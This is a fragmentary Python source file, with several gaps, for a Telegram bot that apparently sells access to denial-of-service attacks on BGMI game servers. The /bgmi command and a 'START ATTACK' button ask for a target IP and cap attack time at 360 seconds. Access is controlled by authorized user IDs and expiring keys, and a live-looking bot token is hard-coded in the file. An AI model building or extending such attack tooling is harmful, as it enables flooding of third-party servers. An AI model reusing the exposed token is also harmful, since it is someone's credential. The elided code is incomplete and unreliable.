...
bot = telebot.TeleBot('8715982891:AAEMGhsA2RBlCbufYVHOBhLDqMC0MfByd4g')
...
# Handler for /bgmi command
# Existing function to handle the /bgmi command
@bot.message_handler(commands=['bgmi'])
@check_authorization
def handle_bgmi(message):
    start_attack_process(message)

# Function to start the attack process, used by both /bgmi and the start attack button
def start_attack_process(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Reset user state to start a new attack process
        user_state[user_id] = {'step': 1}
        bot.reply_to(message, "Enter target IP address:")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

# Ensure the start attack button triggers the same process as /bgmi
@bot.message_handler(func=lambda message: message.text == "⚔️ START ATTACK ⚔️")
@check_authorization
def handle_start_attack_button(message):
    start_attack_process(message)

# Ensure that the step-by-step handling works for both scenarios
    ...
    if user_id in user_state:
        ...
        try:
            ...
            if state['time'] > 360:
                ...
                # Continue the attack process without checking ongoing attacks
...
def is_key_valid(key):
    if key in keys:
        ...
        if datetime.datetime.now() < keys[key]:
            used_keys[key] = True  # Mark key as used
            save_used_keys()  # Save the used keys to a file if needed
            return True
        else:
            del keys[key]
            save_keys()
